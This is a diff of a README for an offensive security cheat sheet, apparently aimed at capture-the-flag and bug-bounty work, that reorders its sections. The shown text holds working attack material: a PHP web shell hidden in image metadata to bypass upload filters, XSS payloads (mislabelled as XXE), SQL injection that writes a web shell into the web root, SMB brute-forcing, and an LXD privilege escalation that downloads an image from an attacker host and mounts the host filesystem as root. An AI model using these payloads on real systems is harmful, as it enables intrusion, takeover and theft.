@@ -3,47 +3,38 @@
 <img alt="GIF" src="https://media1.giphy.com/media/Rm1p7xp3Odl2o/giphy.gif?raw=true" width="500" height="320" />
 
 
-# It might need some time to complete
+# I need some time to make it useful :)
 
-----------------------------------------------------------------------------------------------------------
-## Basic enumeration on linux and windows
-| **Linux**  | **Windows** | **Purpose of command** |
-|------------|-------------|------------------------|
-|`whoami`|`whoami`|Name of current user
-| `uname -a`|`ver`|Operating system
-|`ifconfig`|`ipconfig /all`|Network configuration
-|`netstat -an`|`netstat -an`|Network connections
-|`ps -ef`|`tasklist`|Running processes
+### Contents:
+  - [Categories](#contents)
+      - [Bug Bounty 🤖](#bugbounty)
+      - [Linux 👨🏽‍💻](#linux)
+      - [Windows ](#windows)
+      - [Linux privesc 💫](#linux-privesc)
+      - [Windows privesc 😃](#windows-privesc)
+      - [Extra notes 🗒](#notes)
 
------------------------------------------------------------------------------------------------------------
-# Useful find commands example
 
-`find SUID files`
-```
-find / -user root -perm /4000 2>/dev/null
-```
-```
-find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
-```
-```
-find / -type f -name '*.txt' 2>/dev/null
-```
-```
-find / -perm -u=s -type f 2>/dev/null
-```
-```
-getcap -r / 2>/dev/null
-```
 
-`find and read all hidden flag.txt `
-```
-cat $(find / -name flag.txt 2>/dev/null)
-```
-# Simple bash port scanner
+### BugBounty
+  - [Bypass file upload filtering](#bypass-file-upload-filtering)
+  - [XSS](#xxe-basic-payloads)
+  - [SSTI](#server-side-template-injection-ssti-to-rce)
+  - [LFI](#local-file-inclusion-lfi-payloads)
+  - [RFI](#remote-file-inclusion-rfi)
+  - [SQLI](#sql-injection-payload-list)
 
-```shell
-for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/127.0.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
-```
+### Linux
+ - [Basic enumeration](#basic-enumeration-on-linux-and-windows)
+ - [Useful find commands](#useful-find-commands-example)
+ - [Simple bash port scanner](#simple-bash-port-scanner)
+ - [File permission](https://github.com/akr3ch/CS-AIO-CheatSheet/edit/main/README.md#scecific-permission-for-specific-user)
+ - [SMB enumeration(port 445)](#smb-enumeration)
+### Windows
+- [Basic enumeration](#basic-enumeration-on-linux-and-windows)
+
+### Linux Privesc
+  - [LXC/LXD container](#lxclxd-privilege-escalation)
 
 -------------------------------------------------------------------------------------------------------------
 # Bypass File Upload Filtering
@@ -63,9 +54,21 @@ exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg
 
 mv evil.jpg evil.php.jpg
 ```
+-------------------------------------------------------------------------------------------------------------
 
+
+# XXE basic payloads
+
+```
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+<embed src="javascript:alert(1)">
+<img src="javascript:alert(1)">
+<image src="javascript:alert(1)">
+<script src="javascript:alert(1)">
+```
 ------------------------------------------------------------------------------------------------------------
-## Server Side Template Injection (SSTI) to RCE
+# Server Side Template Injection (SSTI) to RCE
 * At first check if the app is build in Python.
 * Try this, everywhere the app is taking input from the user.
 
@@ -227,19 +230,6 @@ if(!$con)...
 
 ```
 
--------------------------------------------------------------------------------------------------------------
-
-
-# XXE basic payloads
-
-```
-<script>alert('XSS')</script>
-<scr<script>ipt>alert('XSS')</scr<script>ipt>
-<embed src="javascript:alert(1)">
-<img src="javascript:alert(1)">
-<image src="javascript:alert(1)">
-<script src="javascript:alert(1)">
-```
 -------------------------------------------------------------------------------------------------------
 # SQL injection payload list
 `Generic SQL Injection Payloads`
@@ -333,43 +323,44 @@ if(!$con)...
 | `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
 | `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |
 
--------------------------------------------------------------------------------------------------------
-# lxc/lxd Privilege Escalation
+----------------------------------------------------------------------------------------------------------
+## Basic enumeration on linux and windows
+| **Linux**  | **Windows** | **Purpose of command** |
+|------------|-------------|------------------------|
+|`whoami`|`whoami`|Name of current user
+| `uname -a`|`ver`|Operating system
+|`ifconfig`|`ipconfig /all`|Network configuration
+|`netstat -an`|`netstat -an`|Network connections
+|`ps -ef`|`tasklist`|Running processes
 
+-----------------------------------------------------------------------------------------------------------
+# Useful find commands example
+
+`find SUID files`
 ```
-git clone  https://github.com/saghul/lxd-alpine-builder.git
-cd lxd-alpine-builder
-./build-alpine
+find / -user root -perm /4000 2>/dev/null
 ```
-*upload the `apline-v3.10-x86_64-someting-.tar.gz` file from the attacker machine*
 ```
-python -m SimpleHTTPServer
+find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid
+```
+```
+find / -type f -name '*.txt' 2>/dev/null
+```
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+```
+getcap -r / 2>/dev/null
 ```
 
-*download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
+`find and read all hidden flag.txt `
 ```
-cd /tmp
-wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
+cat $(find / -name flag.txt 2>/dev/null)
 ```
+# Simple bash port scanner
 
-*import the lxc image*
-```
-lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
-```
-
-*check the lxc image*
-```
-lxc image list
-```
-
-*run those commands on target machine*
-```
-lxc init
-lxc init myimage ignite -c security.privileged=true
-lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
-lxc start ignite
-lxc exec ignite /bin/sh
-id
+```shell
+for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/127.0.0.1/$PORT &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
 ```
 -------------------------------------------------------------------------------------------------
 # Scecific permission for specific user
@@ -489,3 +480,41 @@ map - Brute Force Accounts (be aware of account lockout!)
 nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt target-IP
 ```
 
+-------------------------------------------------------------------------------------------------------
+# lxc/lxd Privilege Escalation
+
+```shell
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+```
+*upload the `apline-v3.10-x86_64-someting-.tar.gz` file from the attacker machine*
+```shell
+python -m SimpleHTTPServer
+```
+
+*download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
+```shell
+cd /tmp
+wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
+```
+
+*import the lxc image*
+```shell
+lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
+```
+
+*check the lxc image*
+```
+lxc image list
+```
+
+*run these commands on target machine*
+```shell
+lxc init
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+```
